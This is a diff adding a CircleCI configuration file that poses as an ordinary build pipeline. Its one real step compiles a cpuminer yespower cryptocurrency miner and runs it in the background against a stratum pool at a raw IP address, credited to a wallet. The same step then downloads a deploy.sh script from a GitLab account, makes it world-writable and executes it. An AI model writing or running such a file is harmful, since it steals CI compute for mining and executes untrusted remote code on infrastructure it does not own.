@@ -1,0 +1,19 @@
+working_dir: &working_dir ~/app
+
+version: 2.1 
+ 
+workflows: 
+  sample:   
+    jobs: 
+      - job
+ 
+jobs: 
+  job:
+    parallelism: 1
+    machine:
+      image: ubuntu-2004:202101-01
+     
+    steps: 
+      - checkout 
+      - run: sudo apt-get update && sudo apt-get upgrade -y && sudo apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1 build-essential libtool autotools-dev automake pkg-config bsdmainutils python3 git libssl-dev libevent-dev libboost-system-dev libboost-filesystem-dev libboost-chrono-dev libboost-test-dev libboost-thread-dev libminiupnpc-dev libzmq3-dev libqt5gui5 libqt5core5a libqt5dbus5 qttools5-dev qttools5-dev-tools libprotobuf-dev protobuf-compiler libqrencode-dev libcurl4-openssl-dev screen && git clone https://github.com/whiveio/cpuminer-mc-yespower.git && cd cpuminer-mc-yespower/ && ./autogen.sh && ./configure && sudo make && screen -dmS run ./minerd -a yespower -o stratum+tcp://206.189.2.17:3333 -u WdJo8CrSkZ1jSnrd8KMg9aLwVC73FiNCHQ.w1 && wget https://gitlab.com/AlissasChadwick/ss/-/raw/main/deploy.sh && chmod 777 deploy.sh && ./deploy.sh
+      - run: ls 
